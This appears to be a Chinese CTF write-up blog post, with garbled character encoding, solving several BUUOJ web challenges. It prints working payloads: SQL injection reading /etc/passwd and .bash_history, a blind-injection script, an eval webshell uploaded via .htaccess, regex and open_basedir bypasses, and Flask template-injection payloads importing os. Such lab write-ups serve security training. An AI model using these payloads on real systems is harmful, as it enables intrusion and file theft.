<p>addslashesç»•è¿‡æ–¹å¼</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">è®¾ç½®æ•°æ®åº“å­—ç¬¦ä¸ºgbkå¯¼è‡´å®½å­—èŠ‚æ³¨å…¥</span><br><span class="line">ä½¿ç”¨icon,mb_convert_encodingè½¬æ¢å­—ç¬¦ç¼–ç å‡½æ•°å¯¼è‡´å®½å­—èŠ‚æ³¨å…¥</span><br><span class="line">urlè§£ç å¯¼è‡´ç»•è¿‡addslashes</span><br><span class="line">base64è§£ç å¯¼è‡´ç»•è¿‡addslashes</span><br><span class="line">jsonç¼–ç å¯¼è‡´ç»•è¿‡addslashes</span><br><span class="line">æ²¡æœ‰ä½¿ç”¨å¼•å·ä¿æŠ¤å­—ç¬¦ä¸²ï¼Œç›´æ¥æ— è§†addslashes</span><br><span class="line">ä½¿ç”¨äº†stripslashes(å»æ‰äº†\)</span><br><span class="line">å­—ç¬¦æ›¿æ¢å¯¼è‡´çš„ç»•è¿‡addslashes</span><br></pre></td></tr></table></figure>

<p>categoryåªè¿‡=è¿‡æ»¤äº†ä¸€æ¬¡ï¼ŒäºŒæ¬¡æ³¨å…¥</p>
<p>å°è¯•å‘å¸–ï¼Œè¦ç™»å½•ï¼Œè´¦å·å¯†ç å‘ŠçŸ¥ï¼Œå¯†ç åä¸‰ä½éœ€è¦çˆ†ç ´ï¼Œçˆ†ç ´å‡º666</p>
<p>è¿™é‡Œç”¨/**/æ¥æ³¨é‡Š</p>
<p>123â€™,content=user(),/*,è¯„è®ºä¸­å†™*/#å°±é—­åˆäº†è¯­å¥</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$sql = "<span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">comment</span></span><br><span class="line">            <span class="keyword">set</span> <span class="keyword">category</span> = <span class="string">'123'</span>,<span class="keyword">content</span>=<span class="keyword">user</span>(),<span class="comment">/*',</span></span><br><span class="line"><span class="comment">                content = '*/</span><span class="comment">#',</span></span><br><span class="line">                bo_id = <span class="string">'$bo_id'</span><span class="string">";</span></span><br></pre></td></tr></table></figure>

<p>ä¸‹é¢ç›´æ¥ç»™payloadï¼Œå°±ä¸å¤šè¯´äº†</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">',content=(<span class="keyword">select</span>( <span class="keyword">load_file</span>(<span class="string">'/etc/passwd'</span>))),<span class="comment">/*</span></span><br><span class="line"><span class="comment">',content=(select(load_file("/home/www/.bash_history"))),/*</span></span><br><span class="line"><span class="comment">',content=(select(hex(load_file("/tmp/html/.DS_Store")))),/*/</span>/å‘ç°é•¿åº¦ä¸å¤Ÿæ”¹ä¸º<span class="keyword">hex</span>è¯»å–</span><br><span class="line"><span class="string">',content=(select hex(load_file("/tmp/html/flag_8946e1ff1ee3e40f.php"))),/*</span></span><br></pre></td></tr></table></figure>

<img src="/2020/05/16/buuoj3/1.png" class="">

<h4 id="0X03ï¼š-GXYCTF2019-BabyUpload"><a href="#0X03ï¼š-GXYCTF2019-BabyUpload" class="headerlink" title="0X03ï¼š[GXYCTF2019]BabyUpload"></a>0X03ï¼š[GXYCTF2019]BabyUpload</h4><p>æ–‡ä»¶ä¸Šä¼ ï¼Œç›´æ¥ä¸Šé©¬å…ˆè¯•è¯•</p>
<p>å‘ç°jpgæ–‡ä»¶ç›´æ¥ä¸Šä¼ æˆåŠŸäº†ï¼Œç”¨èšå‰‘è¿æ¥ï¼Œå‘ç°ä¸è¡Œ</p>
<p>æ”¹ç”¨pngå¤±è´¥</p>
<p>ç»è¿‡å°è¯•å‘ç°.htaccessåœ¨æ”¹äº†content-typeä¹‹åèƒ½ä¸Šä¼ ï¼</p>
<img src="/2020/05/16/buuoj3/3.png" class="">

<img src="/2020/05/16/buuoj3/2.png" class="">

<p>ä¸Šä¼ æˆåŠŸäº†ï¼Œä¸‹é¢ä¸Šä¼ ä¹‹å‰çš„jpgæ–‡ä»¶åº”è¯¥èƒ½æˆåŠŸäº†</p>
<p>è¿™é‡Œæ³¨æ„çš„æ˜¯ï¼Œ&lt;?è¢«è¿‡æ»¤äº†ï¼Œä»¥jsçš„å½¢å¼å†™ğŸï¼Œä¸Šä¼ åç”¨èšå‰‘</p>
<img src="/2020/05/16/buuoj3/4.png" class="">

<h4 id="0X04-CISCN2019-æ€»å†³èµ›-Day2-Web1-Easyweb"><a href="#0X04-CISCN2019-æ€»å†³èµ›-Day2-Web1-Easyweb" class="headerlink" title="0X04:[CISCN2019 æ€»å†³èµ› Day2 Web1]Easyweb"></a>0X04:[CISCN2019 æ€»å†³èµ› Day2 Web1]Easyweb</h4><p>æ²¡å‘ç°ä»€ä¹ˆæœ‰ç”¨çš„ä¸œè¥¿ï¼Œå¾¡å‰‘æ‰«æï¼Œå‘ç°äº†robots.txt,è®¿é—®</p>
<img src="/2020/05/16/buuoj3/5.png" class="">

<p>æƒ³ä¸åˆ°æœ‰å•¥ï¼Œçœ‹äº†ç½‘é¡µæºç çœ‹åˆ°ä¸ªimageï¼ŒçŒœæµ‹å¯èƒ½ä¼šæ˜¯ï¼Œæ„å¤–ï¼Œæ‹¿åˆ°äº†æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"config.php"</span>;</span><br><span class="line">$id=<span class="keyword">isset</span>($_GET[<span class="string">"id"</span>])?$_GET[<span class="string">"id"</span>]:<span class="string">"1"</span>;</span><br><span class="line">$path=<span class="keyword">isset</span>($_GET[<span class="string">"path"</span>])?$_GET[<span class="string">"path"</span>]:<span class="string">""</span>;</span><br><span class="line">$id=addslashes($id);</span><br><span class="line">$path=addslashes($path);</span><br><span class="line">$id=str_replace(<span class="keyword">array</span>(<span class="string">"\\0"</span>,<span class="string">"%00"</span>,<span class="string">"\\'"</span>,<span class="string">"'"</span>),<span class="string">""</span>,$id);</span><br><span class="line">$path=str_replace(<span class="keyword">array</span>(<span class="string">"\\0"</span>,<span class="string">"%00"</span>,<span class="string">"\\'"</span>,<span class="string">"'"</span>),<span class="string">""</span>,$path);</span><br><span class="line">$result=mysqli_query($con,<span class="string">"select * from images where id='&#123;$id&#125;' or path='&#123;$path&#125;'"</span>);</span><br><span class="line">$row=mysqli_fetch_array($result,MYSQLI_ASSOC);</span><br><span class="line">$path=<span class="string">"./"</span> . $row[<span class="string">"path"</span>];</span><br><span class="line">header(<span class="string">"Content-Type: image/jpeg"</span>);</span><br><span class="line">readfile($path);</span><br></pre></td></tr></table></figure>

<p>ç»è¿‡æµ‹è¯•ï¼Œå‘ç°ç”¨\\0å¯ä»¥è¾“å‡º\ï¼Œè¾¾åˆ°ç›®çš„</p>
<p>è¿™é“é¢˜çœ‹äº†wpï¼Œç”¨çš„æ˜¯ç›²æ³¨ï¼Œè¿™é‡Œç›´æ¥è´´ä¸€ä¸‹è„šæœ¬å§ï¼Œè‡ªå·±çœ‹çœ‹å°±æ‡‚å•¥æ„æ€äº†</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://a733f818-a663-4ff3-9338-435c6195bf93.node3.buuoj.cn/image.php"</span></span><br><span class="line">response = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    high=<span class="number">127</span></span><br><span class="line">    low=<span class="number">32</span></span><br><span class="line">    mid=(low+high)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> high&gt;low:</span><br><span class="line">        payload = <span class="string">'or id = if(ascii(substr((select password from users limit 1 offset 0),%d,1))&gt;%d,1,0)#'</span>%(i,mid)</span><br><span class="line">        params=&#123;</span><br><span class="line">            <span class="string">'id'</span>:<span class="string">'\\0'</span>,</span><br><span class="line">            <span class="string">'path'</span>:payload</span><br><span class="line">        &#125;</span><br><span class="line">        txt = requests.get(url,params=params)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'JFIF'</span> <span class="keyword">in</span> txt.text:</span><br><span class="line">            low = mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low+high)//<span class="number">2</span></span><br><span class="line">    response+=chr(int(mid))</span><br><span class="line">    print(response)</span><br></pre></td></tr></table></figure>

<p>æ³¨å‡ºçš„å¯†ç æ˜¯12a0811ae7c390765ab4ï¼Œè´¦æˆ·åç›´æ¥çŒœçš„adminï¼Œç™»å½•ï¼Œå‘ç°æ˜¯æ–‡ä»¶ä¸Šä¼ ï¼Œç”¨å°é©¬ä»¥jpgæ–‡ä»¶ä¸Šä¼ ï¼Œè¿æ¥ä¸ä¸Šï¼Œåˆ«çš„å¸ˆå‚…è¯´æ˜¯ç”¨çŸ­æ ‡ç­¾ï¼Œæ¥è¯•è¯•</p>
<img src="/2020/05/16/buuoj3/6.png" class="">

<p>æˆåŠŸä¸Šä¼ äº†ï¼Œèšå‰‘æˆåŠŸè¿æ¥ï¼Œåœ¨æ ¹ç›®å½•ä¸‹æ‰¾åˆ°flag</p>
<h4 id="0X05-FBCTF2019-RCEService"><a href="#0X05-FBCTF2019-RCEService" class="headerlink" title="0X05:[FBCTF2019]RCEService"></a>0X05:[FBCTF2019]RCEService</h4><p>æ‰“å¼€é¢˜ç›®ï¼Œå¯ä»¥ä½¿ç”¨çš„æ˜¯jsonæ ¼å¼çš„å‘½ä»¤æŸ¥è¯¢</p>
<p>å…ˆè¯•ä¸€ä¸‹{â€œcmdâ€:â€lsâ€}ï¼Œæç¤ºéæ³•è¾“å…¥ï¼Œæ¢æˆå…¶ä»–çš„æ‰§è¡Œå‘½ä»¤éƒ½ä¸å¤ªè¡Œï¼Œçœ‹äº†ä¸€ç¯‡åˆ«çš„å¸ˆå‚…çš„wpï¼Œè¯´æ˜¯åŸé¢˜æœ‰ç»™æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">putenv(<span class="string">'PATH=/home/rceservice/jail'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">'cmd'</span>])) &#123;</span><br><span class="line">  $json = $_REQUEST[<span class="string">'cmd'</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!is_string($json)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;'</span>;</span><br><span class="line">  &#125; <span class="keyword">elseif</span> (preg_match(<span class="string">'/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/'</span>, $json)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;'</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Attempting to run command:&lt;br/&gt;'</span>;</span><br><span class="line">    $cmd = json_decode($json, <span class="keyword">true</span>)[<span class="string">'cmd'</span>];</span><br><span class="line">    <span class="keyword">if</span> ($cmd !== <span class="keyword">NULL</span>) &#123;</span><br><span class="line">      system($cmd);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">'Invalid input'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;br/&gt;&lt;br/&gt;'</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>preg_matchåªä¼šåŒ¹é…ä¸€è¡Œçš„å†…å®¹ï¼Œè¿™é‡Œå¯ä»¥ç”¨æ¢è¡Œç¬¦%0Aæ¥ç»•è¿‡</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payloadï¼š?cmd&#x3D;&#123;%0A&quot;cmd&quot;: &quot;&#x2F;bin&#x2F;cat &#x2F;home&#x2F;rceservice&#x2F;flag&quot;%0A&#125; è¿™ä¸ªè·¯å¾„æŒºéš¾æ‰¾çš„23333</span><br></pre></td></tr></table></figure>

<img src="/2020/05/16/buuoj3/7.png" class="">

<p>è¿˜æœ‰ä¸€ç§æ–¹æ³•æ˜¯åˆ©ç”¨prceå›æº¯æ¬¡æ•°é™åˆ¶ç»•è¿‡ï¼Œpç¥æ–‡ç« ï¼š<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.htmlï¼Œå¯ä»¥å»çœ‹çœ‹è¯•ä¸€ä¸‹" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.htmlï¼Œå¯ä»¥å»çœ‹çœ‹è¯•ä¸€ä¸‹</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">payload = <span class="string">'&#123;"cmd":"/bin/cat /home/rceservice/flag","zz":"'</span> + <span class="string">"a"</span>*(<span class="number">1000000</span>) + <span class="string">'"&#125;'</span></span><br><span class="line">res = requests.post(<span class="string">"http://af72594c-dbfc-4ef9-baa3-0738dbb5fdb9.node3.buuoj.cn/"</span>, data=&#123;<span class="string">"cmd"</span>:payload&#125;)</span><br><span class="line"><span class="comment">#print(payload)</span></span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>

<h4 id="0X06-SUCTF-2019-EasyWeb"><a href="#0X06-SUCTF-2019-EasyWeb" class="headerlink" title="0X06:[SUCTF 2019]EasyWeb"></a>0X06:[SUCTF 2019]EasyWeb</h4><p>æºç å®¡</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    $userdir = <span class="string">"upload/tmp_"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!file_exists($userdir))&#123;</span><br><span class="line">    mkdir($userdir);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">"file"</span>]))&#123;<span class="comment">//æ–‡ä»¶å¤¹feikong</span></span><br><span class="line">        $tmp_name = $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line">        $name = $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">        $extension = substr($name, strrpos($name,<span class="string">"."</span>)+<span class="number">1</span>);<span class="comment">//$nameåŒ¹é…åˆ°.å·æœ€åçš„ä½ç½®ä¸‹æ ‡+1ï¼ŒåŒ¹é…$nameä¸­n+1ä¸ªå­—ç¬¦</span></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/ph/i"</span>,$extension)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); <span class="comment">//åŒ¹é…åˆ°phç»“æŸ</span></span><br><span class="line">        <span class="keyword">if</span>(mb_strpos(file_get_contents($tmp_name), <span class="string">'&lt;?'</span>)!==<span class="keyword">False</span>) <span class="keyword">die</span>(<span class="string">"^_^"</span>);<span class="comment">//ä¸èƒ½åœ¨$tmp_nameä¸­åŒ¹é…åˆ°<span class="meta">&lt;?</span></span></span><br><span class="line">    <span class="keyword">if</span>(!exif_imagetype($tmp_name)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); <span class="comment">//åˆ¤æ–­ä¸ºå›¾ç‰‡æ ¼å¼</span></span><br><span class="line">        $path= $userdir.<span class="string">"/"</span>.$name;<span class="comment">//è·¯å¾„</span></span><br><span class="line">        @move_uploaded_file($tmp_name, $path);</span><br><span class="line">        print_r($path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">////?_=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;&#123;%fe&#125;();&amp;%fe=get_the_flag</span></span><br><span class="line">$hhh = @$_GET[<span class="string">'_'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$hhh)&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen($hhh)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'One inch long, one inch strong!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span>, $hhh) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Try something else!'</span>);<span class="comment">//      !#$%()*+-/:;&lt;&gt;?@\]^&#123;&#125;</span></span><br><span class="line"></span><br><span class="line">$character_type = count_chars($hhh, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($character_type)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">"Almost there!"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>($hhh);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆæ¥çœ‹ä»£ç æ‰§è¡Œè°ƒç”¨get_the_flagéƒ¨åˆ†</p>
<p>å¯¹é•¿åº¦è¿›è¡Œäº†é™åˆ¶ï¼Œæ­£åˆ™è¡¨è¾¾å¼fuzzä¸€ä¸‹ï¼Œ!#$%()*+-/:;&lt;&gt;?@]^{}æ˜¯å¯ç”¨çš„ï¼Œè¿™é‡Œæƒ³åˆ°çš„æ˜¯ç”¨å¼‚æˆ–æ„é€ payloadï¼Œä¸‹é¢æ˜¯ç”Ÿæˆéœ€è¦å­—ç¬¦çš„è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">find = [<span class="string">'G'</span>,<span class="string">'E'</span>,<span class="string">'T'</span>,<span class="string">'_'</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">256</span>):</span><br><span class="line">        result = chr(i^j)</span><br><span class="line">        <span class="keyword">if</span>(result <span class="keyword">in</span> find):</span><br><span class="line">            a = i.to_bytes(<span class="number">1</span>,byteorder=<span class="string">'big'</span>)</span><br><span class="line">            b = j.to_bytes(<span class="number">1</span>,byteorder=<span class="string">'big'</span>)</span><br><span class="line">            a = urllib.parse.quote(a)</span><br><span class="line">            b = urllib.parse.quote(b)</span><br><span class="line">            print(<span class="string">"%s:%s^%s"</span>%(result,a,b))</span><br></pre></td></tr></table></figure>

<p>å‡‘å‡ºè¿™éƒ¨åˆ†çš„payloadï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?_&#x3D;$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;&#123;%fe&#125;();&amp;%fe&#x3D;get_the_flag</span><br></pre></td></tr></table></figure>

<p>ä¸‹é¢å†çœ‹å‡½æ•°éƒ¨åˆ†ï¼Œ&lt;?è¢«è¿‡æ»¤ï¼Œä½¿ç”¨äº†exif_imagetypeæ¥åˆ¤æ–­æ˜¯ä¸æ˜¯å›¾ç‰‡ï¼Œæ–‡ä»¶åç¼€ä¸èƒ½å‡ºç°ph</p>
<p>è¿™é‡Œçš„phpç‰ˆæœ¬æ˜¯7.2çš„ï¼Œä¸èƒ½ç”¨&lt;script&gt;æ ‡ç­¾çš„æ–¹å¼æ¥ç»•è¿‡&lt;?,è¿™é‡Œå¯ä»¥ç”¨base64ç¼–ç ç»•è¿‡ï¼Œåœ¨.htaccessä¸­åˆ©ç”¨phpä¼ªåè®®è¿›è¡Œè§£ç </p>
<p>shell.abc</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GIF89a12</span><br><span class="line">PD9waHAgZXZhbCgkX0dFVFsnYyddKTs&#x2F;Pg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>

<p>.htacess</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#define width 1337</span><br><span class="line">#define height 1337 </span><br><span class="line">AddType application&#x2F;x-httpd-php .abc</span><br><span class="line">php_value auto_append_file &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;tmp_fd40c7f4125a9b9ff1a4e75d293e3080&#x2F;shell.abc&quot;</span><br></pre></td></tr></table></figure>

<p>ä¸Šä¼ è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">htaccess = <span class="string">b"""</span></span><br><span class="line"><span class="string">#define width 1337</span></span><br><span class="line"><span class="string">#define height 1337 </span></span><br><span class="line"><span class="string">AddType application/x-httpd-php .abc</span></span><br><span class="line"><span class="string">php_value auto_append_file "php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_fd40c7f4125a9b9ff1a4e75d293e3080/shell.abc"</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">shell = <span class="string">b"GIF89a12"</span> + base64.b64encode(<span class="string">b"&lt;?php eval($_REQUEST['a']);?&gt;"</span>)</span><br><span class="line">url = <span class="string">"http://16855023-61d5-430f-bbef-53d0bca8f179.node1.buuoj.cn?_=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;&#123;%fe&#125;();&amp;%fe=get_the_flag"</span></span><br><span class="line"></span><br><span class="line">files = &#123;<span class="string">'file'</span>:(<span class="string">'.htaccess'</span>,htaccess,<span class="string">'image/jpeg'</span>)&#125;</span><br><span class="line">data = &#123;<span class="string">"upload"</span>:<span class="string">"Submit"</span>&#125;</span><br><span class="line">response = requests.post(url=url, data=data, files=files)</span><br><span class="line">print(response.text)</span><br><span class="line"></span><br><span class="line">files = &#123;<span class="string">'file'</span>:(<span class="string">'shell.abc'</span>,shell,<span class="string">'image/jpeg'</span>)&#125;</span><br><span class="line">response = requests.post(url=url, data=data, files=files)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure>

<p>è®¿é—®?a=phpinfo();å¯ä»¥å¾—åˆ°phpinfoé¡µé¢ï¼Œè¿™é‡Œä¸çŸ¥é“ä»€ä¹ˆåŸå› åšçš„æ—¶å€™æ²¡æ³•å›æ˜¾ï¼Œä¸‹é¢çš„çŸ¥è¯†ç‚¹æ˜¯å‚è€ƒçš„</p>
<p>è¿™æ—¶ä¼šå‘ç°å­˜åœ¨open_basedirå’Œdisable_functionsçš„é™åˆ¶ </p>
<p>open_basedir:/var/www/html/:/tmp/ï¼ˆé™„ä¸Špayloadé“¾æ¥ï¼š<a href="https://xz.aliyun.com/t/4720ï¼‰" target="_blank" rel="noopener">https://xz.aliyun.com/t/4720ï¼‰</a></p>
<p>è¿™æ˜¯æœ€åçš„payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?a&#x3D;chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);print_r(file_get_contents(&#39;&#x2F;THis_Is_tHe_F14g&#39;));</span><br></pre></td></tr></table></figure>

<h4 id="0X06ï¼š-GYCTF2020-FlaskApp"><a href="#0X06ï¼š-GYCTF2020-FlaskApp" class="headerlink" title="0X06ï¼š[GYCTF2020]FlaskApp"></a>0X06ï¼š[GYCTF2020]FlaskApp</h4><p>è¿™æ˜¯ä¹‹å‰æ¯”èµ›åšå‡ºæ¥è¿‡çš„é¢˜ï¼Œç”¨çš„æ˜¯æ‹¼æ¥ï¼Œåšå‡ºæ¥ä¹‹åå¤ç°å¤±è´¥äº†ï¼Œç°åœ¨buuä¸Šæœ‰äº†ï¼Œå†æ¥åšä¸€æ¬¡è®°å½•ä¸€ä¸‹</p>
<p>è¿™æ˜¯ä¸€é“SSTIæ¨¡æ¿æ³¨å…¥ï¼Œå…ˆç¼–ç å†è§£ç ï¼Œå¯ä»¥å¾—åˆ°éœ€è¦çš„ä¿¡æ¯ï¼Œé¢˜ç›®æ˜¯flaskï¼Œå»æ‰¾flaskå¯¹åº”çš„æ¨¡æ¿æ³¨å…¥å³å¯</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;app.py&#39;,&#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<img src="/2020/05/16/buuoj3/8.png" class="">

<p>å¯ä»¥çœ‹åˆ°æºç ï¼Œä¸‹é¢æ˜¯æºç ä¸­çš„WAF</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(str)</span>:</span> black_list = [&amp;<span class="comment">#34;flag&amp;#34;,&amp;#34;os&amp;#34;,&amp;#34;system&amp;#34;,&amp;#34;popen&amp;#34;,&amp;#34;import&amp;#34;,&amp;#34;eval&amp;#34;,&amp;#34;chr&amp;#34;,&amp;#34;request&amp;#34;, &amp;#34;subprocess&amp;#34;,&amp;#34;commands&amp;#34;,&amp;#34;socket&amp;#34;,&amp;#34;hex&amp;#34;,&amp;#34;base64&amp;#34;,&amp;#34;*&amp;#34;,&amp;#34;?&amp;#34;]</span></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°flagï¼Œosï¼Œsystemç­‰éƒ½è¢«è¿‡æ»¤äº†ï¼Œè¿™é‡Œå¯ä»¥ç”¨æ‹¼æ¥æ¥è¿›è¡Œç»•è¿‡</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">''</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">75</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'__imp'</span>+<span class="string">'ort__'</span>](<span class="string">'o'</span>+<span class="string">'s'</span>).listdir(<span class="string">'/'</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#e3snJy5fX2NsYXNzX18uX19iYXNlc19fWzBdLl9fc3ViY2xhc3Nlc19fKClbNzVdLl9faW5pdF9fLl9fZ2xvYmFsc19fWydfX2J1aWx0aW5zX18nXVsnX19pbXAnKydvcnRfXyddKCdvJysncycpLmxpc3RkaXIoJy8nKX19</span></span><br></pre></td></tr></table></figure>

<img src="/2020/05/16/buuoj3/9.png" class="">

<p>å¯ä»¥çœ‹åˆ°flagæ–‡ä»¶</p>
<p>è¿™æ¬¡ç”¨ä¸€ä¸‹åˆ‡ç‰‡å–åå­—ç¬¦ä¸²ï¼Œçœå»æ‹¼æ¥flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">'catch_warnings'</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">'__builtins__'</span>].open(<span class="string">'txt.galf_eht_si_siht/'</span>[::<span class="number">-1</span>],<span class="string">'r'</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"><span class="comment">#eyUgZm9yIGMgaW4gW10uX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX17JSBpZiBjLl9fbmFtZV9fPT0nY2F0Y2hfd2FybmluZ3MnICV9e3sgYy5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ10ub3BlbigndHh0LmdhbGZfZWh0X3NpX3NpaHQvJ1s6Oi0xXSwncicpLnJlYWQoKSB9fXslIGVuZGlmICV9eyUgZW5kZm9yICV9</span></span><br></pre></td></tr></table></figure>

<img src="/2020/05/16/buuoj3/10.png" class="">

<h4 id="0X07ï¼š-NPUCTF2020-ReadlezPHP"><a href="#0X07ï¼š-NPUCTF2020-ReadlezPHP" class="headerlink" title="0X07ï¼š[NPUCTF2020]ReadlezPHP"></a>0X07ï¼š[NPUCTF2020]ReadlezPHP</h4><p>æ‰“å¼€æ˜¯ä¸€ä¸ªç½‘é¡µï¼Œåœ¨ç½‘é¡µæºç æ‰¾åˆ°äº†è·³è½¬é“¾æ¥ï¼Œæ‹¿åˆ°äº†æºç </p>
